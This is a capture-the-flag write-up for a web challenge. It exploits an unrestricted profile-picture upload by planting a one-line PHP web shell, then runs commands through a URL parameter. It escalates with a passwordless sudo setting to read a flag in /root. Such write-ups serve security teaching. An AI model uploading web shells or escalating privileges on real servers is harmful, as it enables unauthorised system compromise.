## 📄 Description
A developer added a profile picture upload feature to a website. However, it is vulnerable. Your goal is to explore the page, exploit the file upload functionality, and retrieve the hidden flag located in the `/root` directory.

## Solution Steps
- First, check how the web uploads files, including what language it uses and how file structure is.
- Examine the page source using `ctrl + u` : 
  <img width="1864" height="891" alt="image (1)" src="https://github.com/user-attachments/assets/0eeba5b2-2b45-4ac6-b154-727731204f18" />

- The site uses upload.php and stores uploaded files in the uploads/[file] directory
- For testing, we'll upload a web shell file named `shell.php` containing `<?php system($_GET['cmd']); ?>`. This file will give us **remote command execution (RCE)** from the browser. If successfully uploaded, we can run shell commands like `pwd, ls, cat` etc.
- After uploading shell.php, we see a confirmation message: `The file shell.php has been uploaded Path: uploads/shell.php`
  <img width="640" height="138" alt="image" src="https://github.com/user-attachments/assets/5273e2f5-ee35-4d23-baaf-28eb04478938" />
- We can now execute commands by accessing `http://standard-pizzas.picoctf.net:58432/uploads/shell.php?cmd=ls` which will display the contents of the uploads directory
  <img width="818" height="149" alt="image" src="https://github.com/user-attachments/assets/7bd80118-ff11-45bb-8e60-b6755f220e5e" />
- Next, we need to navigate to the /root folder, but first we should check our current location using the pwd command
  <img width="815" height="141" alt="image" src="https://github.com/user-attachments/assets/b1c6d7b5-4a9f-4d54-bcca-abf2d2c89577" />
- Since direct access to /root is denied (can't use ls /root directly), we'll run `sudo -l` to list commands we can run with sudo. This returns:
  <img width="1832" height="158" alt="image" src="https://github.com/user-attachments/assets/958dd189-e38b-4662-82a5-f41e89673b45" />
This means we can run any command as any user (including root) without a password
- We can now run `sudo ls /root` which shows flag.txt
  <img width="909" height="156" alt="image" src="https://github.com/user-attachments/assets/b808b732-3669-4757-b8b8-5e8012d8aab4" />
- so we execute `sudo cat /root/flag.txt` to show the flag
<img width="1001" height="141" alt="image" src="https://github.com/user-attachments/assets/5ba63396-114b-4807-8be7-21a408bc8372" />

## Conclusion
This challenge demonstrates how a seemingly harmless feature like file upload can lead to full system compromise when security best practices are ignored. By exploiting an unrestricted file upload and a dangerously configured sudo privilege, we gained root access and retrieved the flag. It reinforces the importance of input validation, proper server configuration, and applying the principle of least privilege. This is a solid example of a real-world vulnerability chain—from RCE to full privilege escalation.
